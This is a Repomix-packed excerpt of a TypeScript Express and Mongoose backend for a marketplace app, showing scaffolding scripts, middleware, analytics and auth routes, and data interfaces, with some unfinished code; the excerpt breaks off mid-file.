This file is a merged representation of a subset of the codebase, containing files not matching ignore patterns, combined into a single document by Repomix.

# File Summary

## Purpose
This file contains a packed representation of a subset of the repository's contents that is considered the most important context.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.

## File Format
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  a. A header with the file path (## File: path/to/file)
  b. The full contents of the file in a code block

## Usage Guidelines
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.

## Notes
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching these patterns are excluded: node_modules, dist, coverage, .git, uploads, logs, *.log, *.png, *.jpg, *.jpeg, *.svg, *.pdf
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Files are sorted by Git change count (files with more changes are at the bottom)

# Directory Structure
```
.eslintrc.json
.gitignore
package.json
README.md
src/app.ts
src/app/create_module_tem.ts
src/app/middlewares/auth.ts
src/app/middlewares/globalErrorHandler.ts
src/app/middlewares/mongooseMiddleware.ts
src/app/middlewares/multerMiddleware.ts
src/app/middlewares/notFound.ts
src/app/middlewares/subscription.ts
src/app/middlewares/uploadAwsS3.ts
src/app/middlewares/validateRequest.ts
src/app/module/Analytics/Analytics.controller.ts
src/app/module/Analytics/Analytics.interface.ts
src/app/module/Analytics/Analytics.model.ts
src/app/module/Analytics/Analytics.routes.ts
src/app/module/Analytics/Analytics.service.ts
src/app/module/Analytics/Analytics.validation.ts
src/app/module/auth/auth.controller.ts
src/app/module/auth/auth.interface.ts
src/app/module/auth/auth.model.ts
src/app/module/auth/auth.routes.ts
src/app/module/auth/auth.service.ts
src/app/module/auth/auth.validation.ts
src/app/module/Buyer/Buyer.controller.ts
src/app/module/Buyer/Buyer.interface.ts
src/app/module/Buyer/Buyer.model.ts
src/app/module/Buyer/Buyer.routes.ts
src/app/module/Buyer/Buyer.service.ts
src/app/module/Buyer/Buyer.validation.ts
src/app/module/Cart/Cart.controller.ts
src/app/module/Cart/Cart.interface.ts
src/app/module/Cart/Cart.model.ts
src/app/module/Cart/Cart.routes.ts
src/app/module/Cart/Cart.service.ts
src/app/module/Cart/Cart.validation.ts
src/app/module/Chat/Chat.interface.ts
src/app/module/Chat/Chat.model.ts
src/app/module/Chat/Chat.routes.ts
src/app/module/Chat/Chat.service.ts
src/app/module/Chat/Chat.socket.ts
src/app/module/Chat/Chat.validation.ts
src/app/module/Dashboard/Admin.model.ts
src/app/module/Dashboard/Dashboard.controller.ts
src/app/module/Dashboard/Dashboard.interface.ts
src/app/module/Dashboard/Dashboard.routes.ts
src/app/module/Dashboard/Dashboard.service.ts
src/app/module/Dashboard/Dashboard.validation.ts
src/app/module/Engagement/Engagement.controller.ts
src/app/module/Engagement/Engagement.interface.ts
src/app/module/Engagement/Engagement.model.ts
src/app/module/Engagement/Engagement.routes.ts
src/app/module/Engagement/Engagement.service.ts
src/app/module/Engagement/Engagement.validation.ts
src/app/module/Notification/Notification.controller.ts
src/app/module/Notification/Notification.interface.ts
src/app/module/Notification/Notification.model.ts
src/app/module/Notification/Notification.routes.ts
src/app/module/Notification/Notification.service.ts
src/app/module/Notification/Notification.validation.ts
src/app/module/OldPair/OldPair.controller.ts
src/app/module/OldPair/OldPair.interface.ts
src/app/module/OldPair/OldPair.model.ts
src/app/module/OldPair/OldPair.routes.ts
src/app/module/OldPair/OldPair.service.ts
src/app/module/OldPair/OldPair.validation.ts
src/app/module/Order/Checkout.service.ts
src/app/module/Order/Order.controller.ts
src/app/module/Order/Order.interface.ts
src/app/module/Order/Order.model.ts
src/app/module/Order/Order.routes.ts
src/app/module/Order/Order.service.ts
src/app/module/Order/Order.validation.ts
src/app/module/Pairs/Pairs.controller.ts
src/app/module/Pairs/Pairs.interface.ts
src/app/module/Pairs/Pairs.model.ts
src/app/module/Pairs/Pairs.routes.ts
src/app/module/Pairs/Pairs.service.ts
src/app/module/Pairs/Pairs.validation.ts
src/app/module/Payment/Payment.controller.ts
src/app/module/Payment/Payment.interface.ts
src/app/module/Payment/Payment.model.ts
src/app/module/Payment/Payment.routes.ts
src/app/module/Payment/Payment.service.ts
src/app/module/Payment/Payment.validation.ts
src/app/module/Payment/PaymentSuccess.service.ts
src/app/module/Product/Product.controller.ts
src/app/module/Product/Product.interface.ts
src/app/module/Product/Product.model.ts
src/app/module/Product/Product.routes.ts
src/app/module/Product/Product.service.ts
src/app/module/Product/Product.validation.ts
src/app/module/Promotion/Promotion.controller.ts
src/app/module/Promotion/Promotion.interface.ts
src/app/module/Promotion/Promotion.model.ts
src/app/module/Promotion/Promotion.routes.ts
src/app/module/Promotion/Promotion.service.ts
src/app/module/Promotion/Promotion.validation.ts
src/app/module/Report/Report.controller.ts
src/app/module/Report/Report.interface.ts
src/app/module/Report/Report.model.ts
src/app/module/Report/Report.routes.ts
src/app/module/Report/Report.service.ts
src/app/module/Report/Report.validation.ts
src/app/module/Reseller/Reseller.controller.ts
src/app/module/Reseller/Reseller.interface.ts
src/app/module/Reseller/Reseller.model.ts
src/app/module/Reseller/Reseller.routes.ts
src/app/module/Reseller/Reseller.service.ts
src/app/module/Reseller/Reseller.validation.ts
src/app/module/Retailer/Retailer.controller.ts
src/app/module/Retailer/Retailer.interface.ts
src/app/module/Retailer/Retailer.model.ts
src/app/module/Retailer/Retailer.routes.ts
src/app/module/Retailer/Retailer.service.ts
src/app/module/Retailer/Retailer.validation.ts
src/app/module/Settings/Settings.controller.ts
src/app/module/Settings/Settings.interface.ts
src/app/module/Settings/Settings.model.ts
src/app/module/Settings/Settings.routes.ts
src/app/module/Settings/Settings.service.ts
src/app/module/Settings/Settings.validation.ts
src/app/module/User/User.controller.ts
src/app/module/User/User.interface.ts
src/app/module/User/User.model.ts
src/app/module/User/User.routes.ts
src/app/module/User/User.service.ts
src/app/module/User/User.validation.ts
src/app/routes/index.ts
src/config/awsS3.ts
src/config/index.ts
src/config/mongoDB.ts
src/config/openAI.ts
src/config/stripe.ts
src/error/ApiError.ts
src/error/handleCastError.ts
src/error/handleDuplicateError.ts
src/error/handleValidationError.ts
src/error/handleZodError.ts
src/helper/bcryptHelper.ts
src/helper/datingSuggestions.ts
src/helper/emailHelper.ts
src/helper/jwtHelper.ts
src/helper/multer.ts
src/helper/multerS3.ts
src/helper/notification.ts
src/helper/sendEmail.ts
src/interface/authRequest.ts
src/interface/email.interface.ts
src/interface/error.interface.ts
src/interface/index.d.ts
src/interface/jwt.interface.ts
src/mailTemplate/registerSucessEmail.ts
src/mailTemplate/resetPassEmailTemp.ts
src/mailTemplate/resetPasswordEmailBody.ts
src/mailTemplate/supportEmailTemp.ts
src/mailTemplate/verifyEmailTemp.ts
src/server.ts
src/shared/logger.ts
src/socket/emitError.ts
src/socket/emitResult.ts
src/socket/socket.connection.ts
src/utilities/awsS3Delete.ts
src/utilities/catchasync.ts
src/utilities/codeGenerator.ts
src/utilities/deleteFile.ts
src/utilities/enum.ts
src/utilities/postNotification.ts
src/utilities/sendImageToCloudinary.ts
src/utilities/sendResponse.ts
src/utilities/timestamp.ts
tsconfig.json
```

# Files

## File: .eslintrc.json
```json
{
  "parser": "@typescript-eslint/parser",
  "extends": ["plugin:@typescript-eslint/recommended", "prettier"],
  "plugins": ["@typescript-eslint"],
  "rules": {
    "no-unused-vars": "warn",
    "@typescript-eslint/no-explicit-any": "off"
  }
}
```

## File: src/app/create_module_tem.ts
```typescript
/* eslint-disable no-undef */
import fs from 'fs';
import { modelNames } from 'mongoose';
import path from 'path';

// Function to create module folder and files inside a given profile folder
function createModule(profileName: string, moduleName: string): void {
    const baseDir = path.join(__dirname, profileName);
    if (!fs.existsSync(baseDir)) {
        fs.mkdirSync(baseDir);
    }

    const moduleDir = path.join(baseDir, moduleName);
    if (!fs.existsSync(moduleDir)) {
        fs.mkdirSync(moduleDir);
    }
    const files: string[] = [
        `${moduleName}.interface.ts`,
        `${moduleName}.routes.ts`,
        `${moduleName}.model.ts`,
        `${moduleName}.controller.ts`,
        `${moduleName}.service.ts`,
        `${moduleName}.validation.ts`,
    ];

    const defaultContents: Record<string, string> = {
        [`${moduleName}.interface.ts`]: `import { Types } from "mongoose";

export interface I${capitalize(moduleName)} {
    user: Types.ObjectId;
    name: string;
    username?: string;
    phone?: string;
    email: string;
    address?: string;
    profile_image?: string;
    totalAmount?: number;
    totalPoint?: number;
}`,

        [`${moduleName}.routes.ts`]: `import express from "express";
import {auth} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import ${moduleName}Validations from "./${moduleName}.validation";
import ${moduleName}Controller from "./${moduleName}.controller";


const ${moduleName}Router = express.Router();



export default ${moduleName}Router;`,

        [`${moduleName}.model.ts`]: `import { model, Schema, models } from "mongoose";
import { I${capitalize(moduleName)} } from "./${moduleName}.interface";

const ${moduleName}Schema = new Schema<I${capitalize(moduleName)}>({
    user: { type: Schema.Types.ObjectId, required: true, ref: "User" },
    name: { type: String, required: true },
    phone: { type: String },
    email: { type: String, required: true, unique: true },
    address: { type: String },
    profile_image: { type: String, default: "" },
    totalAmount: { type: Number, default: 0 },
    totalPoint: { type: Number, default: 0 }
}, { timestamps: true });

const ${moduleName}Model = models.${capitalize(moduleName)} || model<I${capitalize(moduleName)}>("${capitalize(
            moduleName
        )}", ${moduleName}Schema);

export default ${moduleName}Model;`,

        [`${moduleName}.controller.ts`]: `import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import ${moduleName}Services from "./${moduleName}.service";

const u = catchAsync(async (req, res) => {

    const result = await ${moduleName}Services.u();

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "P",
        data: result,
    });
});

const ${capitalize(moduleName)}Controller = { u };

export default ${capitalize(moduleName)}Controller;`,

        [`${moduleName}.service.ts`]: `import ApiError from "../../../error/ApiError";
import { I${capitalize(moduleName)} } from "./${moduleName}.interface";
import ${moduleName}Model from "./${moduleName}.model";

const u = async () => {

};

const ${capitalize(moduleName)}Services = { u };

export default ${capitalize(moduleName)}Services;`,

        [`${moduleName}.validation.ts`]: `import { z } from "zod";

        
const u = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const ${capitalize(moduleName)}Validations = { u };

export default ${capitalize(moduleName)}Validations;`,
    };

    files.forEach((file) => {
        const filePath = path.join(moduleDir, file);
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, defaultContents[file], 'utf8');
        }
    });

    console.log(
        `Module '${moduleName}' created successfully inside '${profileName}'.`
    );
}

function capitalize(str: string): string {
    return str.charAt(0).toUpperCase() + str.slice(1);
}

const args: string[] = process.argv.slice(2);
if (args.length !== 2) {
    console.log('Usage: ts-node script.ts <profileName> <moduleName>');
    process.exit(1);
}

const profileName: string = args[0];
const moduleName: string = args[1];
createModule(profileName, moduleName);
```

## File: src/app/middlewares/globalErrorHandler.ts
```typescript
// /* eslint-disable @typescript-eslint/no-explicit-any */
// import { ErrorRequestHandler } from 'express';
// import { ZodError } from 'zod';
// import config from '../config';
// import handleZodError from '../error/handleZodError';
// import { TErrorSources } from '../interface/error.interface';
// import handleValidationError from '../error/handleValidationError';
// import handleCastError from '../error/handleCastError';
// import handleDuplicateError from '../error/handleDuplicateError';
// import AppError from '../error/appError';

// // dynamic error handling and send error after make formatting ----------------------------------

// const globalErrorHandler: ErrorRequestHandler = (
//   err,
//   req,
//   res,
//   // eslint-disable-next-line no-unused-vars, @typescript-eslint/no-unused-vars
//   next,
// ) => {
//   // setting default values
//   let statusCode = 500;
//   let message = 'Something went wrong';

//   let errorSources: TErrorSources = [
//     {
//       path: '',
//       message: 'Something went wrong',
//     },
//   ];

//   if (err instanceof ZodError) {
//     const simplifiedError = handleZodError(err);
//     statusCode = simplifiedError?.statusCode;
//     message = simplifiedError?.message;
//     errorSources = simplifiedError?.errorSources;
//   } else if (err?.name === 'ValidationError') {
//     const simplifiedError = handleValidationError(err);
//     statusCode = simplifiedError?.statusCode;
//     message = simplifiedError?.message;
//     errorSources = simplifiedError?.errorSources;
//   } else if (err?.name === 'CastError') {
//     const simplifiedError = handleCastError(err);
//     statusCode = simplifiedError?.statusCode;
//     message = simplifiedError?.message;
//     errorSources = simplifiedError?.errorSources;
//   } else if (err?.code === 11000) {
//     const simplifiedError = handleDuplicateError(err);
//     statusCode = simplifiedError?.statusCode;
//     message = simplifiedError?.message;
//     errorSources = simplifiedError?.errorSources;
//   } else if (err instanceof AppError) {
//     statusCode = err?.statusCode;
//     message = err?.message;
//     errorSources = [
//       {
//         path: '',
//         message: err.message,
//       },
//     ];
//   } else if (err instanceof Error) {
//     message = err?.message;
//     errorSources = [
//       {
//         path: '',
//         message: err.message,
//       },
//     ];
//   }

//   // ultimate return -----------
//   return res.status(statusCode).json({
//     success: false,
//     message,
//     errorSources,
//     // err,
//     stack: config.NODE_ENV === 'development' ? err.stack : null,
//   });
// };

// export default globalErrorHandler;

// new global error handler-------------------
// import { ErrorRequestHandler } from 'express';
// import { ZodError } from 'zod';
// import AppError from '../error/appError';
// import mongoose from 'mongoose';
// const globalErrorHandler: ErrorRequestHandler = (
//   err,
//   req,
//   res,
//   // eslint-disable-next-line no-unused-vars, @typescript-eslint/no-unused-vars
//   next,
// ) => {
//   let statusCode = 500;
//   let message = 'Something went wrong';
//   let errorMessage = '';
//   let errorDetails = {};

//   if (err.code === 11000) {
//     message = 'Duplicate Error';
//     const match = err.message.match(/"([^"]*)"/);
//     const extractedMessage = match && match[1];
//     errorMessage = `${extractedMessage} is already exists`;
//     statusCode = 400;
//   } else if (err instanceof ZodError) {
//     message = 'Validation Error';
//     const concatedMessage = err.issues.map((issue, index) => {
//       if (index === err.issues.length - 1) {
//         return issue.message;
//       } else {
//         return issue.message + '.';
//       }
//     });
//     errorMessage = concatedMessage.join(' ') + '.';
//     errorDetails = {
//       issues: err.issues,
//     };
//   } else if (err instanceof mongoose.Error.ValidationError) {
//     message = 'Mongoose Validation Error';
//     errorMessage = Object.values(err.errors)
//       .map((val) => val.message)
//       .join(', ');
//     errorDetails = err.errors;
//     statusCode = 400;
//   } else if (err instanceof AppError) {
//     statusCode = err.statusCode;
//     errorMessage = err.message;
//   } else if (err?.name === 'CastError') {
//     statusCode = 400;
//     message = 'Invalid ID';
//     errorMessage = `${err.value} is not a valid ID!`;
//     errorDetails = err;
//   }
//   return res.status(statusCode).json({
//     success: false,
//     message: message,
//     errorMessage: errorMessage,
//     errorDetails,
//     stack: err?.stack || null,
//     // err,
//   });
// };

// export default globalErrorHandler;

import { ErrorRequestHandler } from 'express';
import { ZodError } from 'zod';
import ApiError from '../../error/ApiError';
import mongoose from 'mongoose';
const globalErrorHandler: ErrorRequestHandler = (
  err,
  req,
  res,
  // eslint-disable-next-line no-unused-vars, @typescript-eslint/no-unused-vars
  next,
) => {
  let statusCode = 500;
  // let message = 'Something went wrong';
  let errorMessage = 'Something went wrong';
  let errorDetails = {};

  if (err.code === 11000) {
    // message = 'Duplicate Error';
    const match = err.message.match(/"([^"]*)"/);
    const extractedMessage = match && match[1];
    errorMessage = `${extractedMessage} is already exists`;
    statusCode = 400;
  } else if (err instanceof ZodError) {
    // message = 'Validation Error';
    const concatedMessage = err.issues.map((issue, index) => {
      if (index === err.issues.length - 1) {
        return issue.message;
      } else {
        return issue.message + '.';
      }
    });
    errorMessage = concatedMessage.join(' ') + '.';
    errorDetails = {
      issues: err.issues,
    };
  } else if (err instanceof mongoose.Error.ValidationError) {
    // message = 'Mongoose Validation Error';
    errorMessage = Object.values(err.errors)
      .map((val) => val.message)
      .join(', ');
    errorDetails = err.errors;
    statusCode = 400;
  } else if (err instanceof ApiError) {
    statusCode = err.statusCode;
    errorMessage = err.message;
  } else if (err?.name === 'CastError') {
    statusCode = 400;
    // message = 'Invalid ID';
    errorMessage = `${err.value} is not a valid ID!`;
    errorDetails = err;
  }
  return res.status(statusCode).json({
    success: false,
    message: errorMessage,
    // errorMessage: errorMessage,
    errorDetails,
    stack: err?.stack || null,
    // err,
  });
};

export default globalErrorHandler;
```

## File: src/app/middlewares/notFound.ts
```typescript
import { NextFunction, Request, Response } from 'express';
// import httpStatus from 'http-status';

// eslint-disable-next-line no-unused-vars, @typescript-eslint/no-unused-vars
const notFound = (req: Request, res: Response, next: NextFunction) => {
  return res
    .status(404)
    .json({ success: false, message: 'Api Not found', error: '' });
};

export default notFound;
```

## File: src/app/middlewares/subscription.ts
```typescript
import { NextFunction, Request, Response } from "express";
import UserModel from "../module/User/User.model";
import ApiError from "../../error/ApiError";
import { IJwtPayload } from "../../interface/jwt.interface";

//middleware to check subscription plan
export const checkSubscription = async (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  const { profileId } = req.user as IJwtPayload; // assuming auth middleware attaches user

  const user = await UserModel.findById(profileId);

  if (!user) {
    throw new ApiError(404, "User not found to check subscription plan.");
  }

  // 1️⃣ If user has subscription
  if (user?.subscription?.isSubscribed) {
    return next();
  }

  // 3️⃣ Limit reached
  throw new ApiError(403, "Please buy subscription plan to unlock everything.");
};

//middleware to check matching count
export const checkMatchLimit = async (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  const { profileId } = req.user as IJwtPayload; // assuming auth middleware attaches user

  const user = await UserModel.findById(profileId);

  if (!user) {
    throw new ApiError(404, "User not found to check subscription plan.");
  }

  // 1️⃣ If user has subscription
  if (user?.subscription?.isSubscribed) {
    return next();
  }

  // 2️⃣ Check matchCount
  if (user.matchCount < 3) {

    // increase match count
    await UserModel.findByIdAndUpdate(profileId, {
      $inc: { matchCount: 1 }
    });

    return next();
  }

  // 3️⃣ Limit reached
  throw new ApiError(403, "You have reached your limit. Please buy subscription plan for unlimited matching.");
};

// const user = await UserModel.findOneAndUpdate(
//   {
//     _id: profileId,
//     matchCount: { $lt: 3 }
//   },
//   {
//     $inc: { matchCount: 1 }
//   },
//   { new: true }
// );

// export const checkMatchLimit = async (
//   req: Request,
//   res: Response,
//   next: NextFunction
// ) => {
//   const { profileId } = req.user as any;

//   // Step 1: check if user has subscription
//   const subscribedUser = await UserModel.findOne({
//     _id: profileId,
//     "subscription.isSubscribed": true,
//   });

//   if (subscribedUser) {
//     return next();
//   }

//   // Step 2: user is NOT subscribed → apply limit
//   const user = await UserModel.findOneAndUpdate(
//     {
//       _id: profileId,
//       matchCount: { $lt: 3 },
//     },
//     {
//       $inc: { matchCount: 1 },
//     },
//     { new: true }
//   );

//   // Step 3: if null → limit reached
//   if (!user) {
//     throw new ApiError(403, "You have reached your limit.");
//   }

//   return next();
// };
```

## File: src/app/middlewares/uploadAwsS3.ts
```typescript
// middlewares/uploadToS3.ts
import multer from "multer";
import multerS3 from "multer-s3";
import path from "path";
import { s3 } from "../../config/awsS3";

// router.post(
//   "/upload-multiple",
//   uploadToS3.array("files", 5),
//   createPost
// );

// router.post(
//   "/upload",
//   uploadToS3.single("file"),
//   createPost
// );

// const createPost = catchAsync(async (req, res) => {
//   const file = req.file as Express.MulterS3.File;

//   // S3 gives you a public URL
//   const fileUrl = file.location;

//   sendResponse(res, {
//     statusCode: 200,
//     success: true,
//     message: "File uploaded successfully",
//     data: {
//       url: fileUrl,
//       key: file.key,
//     },
//   });
// });




const multerS3Storage = multerS3({
    s3,
    bucket: process.env.AWS_BUCKET_NAME!,
    acl: "public-read", // or private
    contentType: multerS3.AUTO_CONTENT_TYPE,

    key: (req, file, cb) => {
      const ext = path.extname(file.originalname);
      const fileName = `uploads/${Date.now()}-${file.originalname}`;
      cb(null, fileName);
    },
  });

//upload image to s3
export const uploadImageToS3 = multer({
  storage: multerS3Storage,

  limits: {
    fileSize: 3 * 1024 * 1024, // 50MB
  },

  fileFilter: (req, file, cb) => {
    const allowedMimeTypes = [
      "image/png",
      "image/jpeg",
      "image/jpg",
    ];

    if (allowedMimeTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error("Invalid file type. Only PNG, JPEG, and JPG are allowed."));
    }
  },
});

//upload video s3
export const uploadVideoToS3 = multer({
  storage: multerS3Storage,

  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB
  },

  fileFilter: (req, file, cb) => {
    const allowedMimeTypes = [
      "video/mp4",
      "video/webm",
      "video/ogg",
      "video/quicktime",
      "video/avi",
      "video/mov",
      "video/wmv",
      "video/flv",
      "video/mkv",
      "video/3gp"
    ];

    if (allowedMimeTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error("Invalid file type. Only MP4 and WEBM are allowed."));
    }
  },
});
```

## File: src/app/middlewares/validateRequest.ts
```typescript
import { NextFunction, Request, Response } from 'express';
import { ZodObject } from 'zod';
import catchAsync from '../../utilities/catchasync';

const validateRequest = (schema: ZodObject) => {
  return catchAsync(async (req: Request, res: Response, next: NextFunction) => {
    // if everything is alright next()=>
    await schema.parseAsync({
      body: req.body,
      cookies: req.cookies,
    });
    return next();
  });
};

export default validateRequest;
```

## File: src/app/module/Analytics/Analytics.controller.ts
```typescript
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import AnalyticsServices from "./Analytics.service";

const u = catchAsync(async (req, res) => {

    // const result = await AnalyticsServices.u();

    // sendResponse(res, {
    //     statusCode: 200,
    //     success: true,
    //     message: "P",
    //     data: result,
    // });
});

const AnalyticsController = {  };

export default AnalyticsController;
```

## File: src/app/module/Analytics/Analytics.interface.ts
```typescript
import { Types } from "mongoose";

export interface IAnalytics {
    retailerId: Types.ObjectId;
    profileViewCount: number;
    productViewCount: number;
}

export interface IAnalyticsReseller {
    resellerId: Types.ObjectId;
    profileViewCount: number;
    pairViewCount: number;
}
```

## File: src/app/module/Analytics/Analytics.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IAnalytics, IAnalyticsReseller } from "./Analytics.interface";

const AnalyticsSchema = new Schema<IAnalytics>({
    retailerId: { type: Schema.Types.ObjectId, required: true, ref: "Retailer" },
    profileViewCount: { type: Number, default: 1 },
    productViewCount: { type: Number, default: 1 }
}, { timestamps: true });

const AnalyticsSchemaReseller = new Schema<IAnalyticsReseller>({
    resellerId: { type: Schema.Types.ObjectId, required: true, ref: "Reseller" },
    profileViewCount: { type: Number, default: 1 },
    pairViewCount: { type: Number, default: 1 }
}, { timestamps: true });

const AnalyticsModel = models.Analytics || model<IAnalytics>("Analytics", AnalyticsSchema);

export default AnalyticsModel;
```

## File: src/app/module/Analytics/Analytics.routes.ts
```typescript
import express from "express";
import {auth} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import AnalyticsValidations from "./Analytics.validation";
import AnalyticsController from "./Analytics.controller";


const AnalyticsRouter = express.Router();



export default AnalyticsRouter;
```

## File: src/app/module/Analytics/Analytics.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { IAnalytics } from "./Analytics.interface";
import AnalyticsModel from "./Analytics.model";

//profile view count service function
const increaseProfileViewCount = async (retailerId: string) => {

    const analytics = await AnalyticsModel.findByIdAndUpdate(
        retailerId,
        {
            profileViewCount: {$inc: 1}
        }
    );

    //if not exist then create
    if(!analytics){
        const newAnalytics = await AnalyticsModel.create({
            retailerId: retailerId
        });

        if(!newAnalytics){
            throw new ApiError(500,"Failed to create new analytics collection.");
        }
    }

    return null;

};

//product view count service function
const increaseProductViewCount = async (retailerId: string) => {

    const analytics = await AnalyticsModel.findByIdAndUpdate(
        retailerId,
        {
            productViewCount: {$inc: 1}
        }
    );

    //if not exist then create
    if(!analytics){
        const newAnalytics = await AnalyticsModel.create({
            retailerId: retailerId
        });

        if(!newAnalytics){
            throw new ApiError(500,"Failed to create new analytics collection.");
        }
    }

    return null;

};

const AnalyticsServices = { 

};

export default AnalyticsServices;
```

## File: src/app/module/Analytics/Analytics.validation.ts
```typescript
import { z } from "zod";

        
const u = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const AnalyticsValidations = { u };

export default AnalyticsValidations;
```

## File: src/app/module/auth/auth.routes.ts
```typescript
import express from "express";
import {auth} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import AuthValidations from "./auth.validation";
import AuthController from "./auth.controller";


const authRouter = express.Router();

authRouter.post("/register-user",
    validateRequest(AuthValidations.registerUserValidationSchema) , 
    AuthController.registerUser
);

authRouter.post("/login-user",
    validateRequest(AuthValidations.loginValidationSchema)  ,
    AuthController.loginUser
);

authRouter.post("/verify-code",
    validateRequest(AuthValidations.verifyCodeValidation)  ,
    AuthController.verifyCode
);

authRouter.post("/send-verify-code",
    validateRequest(AuthValidations.sendVerifyCodeValidation)  ,
    AuthController.sendVerifyCode
);

authRouter.patch("/reset-password",
    validateRequest(AuthValidations.resetPasswordValidation)  ,
    AuthController.resetPassword
);


export default authRouter;
```

## File: src/app/module/Cart/Cart.validation.ts
```typescript
import { z } from "zod";

        
const u = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const CartValidations = { u };

export default CartValidations;
```

## File: src/app/module/Chat/Chat.interface.ts
```typescript
import { Types,Document } from "mongoose";

export interface IConversation extends Document {
  participants: Types.ObjectId[];
  lastMessage?: Types.ObjectId;
  status: string;
  updatedAt: Date;
}

export interface IMessage extends Document {
  conversationId: Types.ObjectId;
  sender: Types.ObjectId;
  receiver: Types.ObjectId;
  text: string;
  seen: boolean;
}
```

## File: src/app/module/Chat/Chat.routes.ts
```typescript
// import express from "express";
// import auth from "../../middlewares/auth";
// import validateRequest from "../../middlewares/validateRequest";
// import ChatValidations from "./Chat.validation";
// import ChatController from "./Chat.socket";


// const ChatRouter = express.Router();



// export default ChatRouter;
```

## File: src/app/module/Chat/Chat.validation.ts
```typescript
import { z } from "zod";

        
const u = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const ChatValidations = { u };

export default ChatValidations;
```

## File: src/app/module/Dashboard/Dashboard.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import DashboardService from "./Dashboard.service";


const adminRegister = catchAsync(
    async (req,res) => {
        const result = await DashboardService.registerAdminService(req.body);

        sendResponse(res,{
            statusCode: 201,
            success: true,
            message: "New admin created",
            data: result
        });
    }
);

const adminLogin = catchAsync(
    async (req,res) => {
        const result = await DashboardService.loginAdminService(req.body);

        sendResponse(res,{
            statusCode: 200,
            success: true,
            message: "Admin logged in successfully.",
            data: result
        });
    }
);

const adminVerifyCode = catchAsync(async (req, res) => {
    
    const result = await DashboardService.adminVerifyCode(req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Code verified successfully.",
        data: result,
    });
});

const adminSendVerifyCode = catchAsync(async (req, res) => {
    
    const result = await DashboardService.adminSendVerifyCodeService(req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Verification code sent successfully.",
        data: result,
    });
});

const adminResetPassword = catchAsync(async (req, res) => {

     const { user } = req as AuthRequest;
    
    const result = await DashboardService.adminResetPasswordService(user,req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Password reset successfully.",
        data: result,
    });
});

const editAdminProfile = catchAsync(
    async (req,res) => {
         const { user } = req as AuthRequest;

        const result = await DashboardService.editProfileService(user,req.file,req.body);

        sendResponse(res,{
            statusCode: 200,
            success: true,
            message: "Updated admin data successfully",
            data: result
        });
    }
);

const changeAdminPassword = catchAsync(
    async (req,res) => {

         const { user } = req as AuthRequest;

        const result = await DashboardService.changeAdminPasswordService(user,req.body);

        sendResponse(res,{
            statusCode: 200,
            success: true,
            message: "Admin password changed successfully",
            data: result
        });
    }
);

const deleteAdminAccount = catchAsync(
    async (req,res) => {
         const { user } = req as AuthRequest;
        const result = await DashboardService.deleteAdminService(user);

        sendResponse(res,{
            statusCode: 200,
            success: true,
            message: "Admin deleted successfully.",
            data: null
        });
    }
);

const dashboardStat = catchAsync(
    async (req,res) => {
        const result = await DashboardService.loginAdminService(req.body);

        sendResponse(res,{
            statusCode: 201,
            success: true,
            message: "Got website stat",
            data: result
        });
    }
);

const blockAdmin = catchAsync(
    async (req,res) => {
        const result = await DashboardService.blockAdminService(req.params.id);

        sendResponse(res,{
            statusCode: 200,
            success: true,
            message: result.msg,
            data: result.admin
        });
    }
);


const DashboardController = {
    adminRegister,
    adminLogin,
    adminVerifyCode,
    adminSendVerifyCode,
    adminResetPassword,
    editAdminProfile,
    changeAdminPassword,
    deleteAdminAccount,
    dashboardStat,
    blockAdmin
}

export default DashboardController;
```

## File: src/app/module/Dashboard/Dashboard.interface.ts
```typescript
export interface IAdmin {
    name: string;
    email: string;
    phone: string;
    contact: string;
    address: string;
    password: string;
    role: string;
    verificationCode: string;
    isEmailVerified: boolean;
    isBlocked: boolean;
}
```

## File: src/app/module/OldPair/OldPair.interface.ts
```typescript
import { Types } from "mongoose";

export interface IOldPair {
    buyerId: Types.ObjectId;
    name: string;
    details: string;
    images: string[];
    price: number;
    offerHistory: IOfferHistory[];
    brand: string;
    size: string;
    condition: string;
    status: string;
    isVisible:boolean;
    visiblityDistance: number //km
}


export interface IOfferHistory {
    offeredBy: "Retailer" | "Buyer";
    price: number;
    // note?: string;
    createdAt: Date;
}
```

## File: src/app/module/OldPair/OldPair.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IOldPair } from "./OldPair.interface";
import { ENUM_OLD_PAIR_CONTITION, ENUM_USER_Type } from "../../../utilities/enum";

const OldPairSchema = new Schema<IOldPair>({
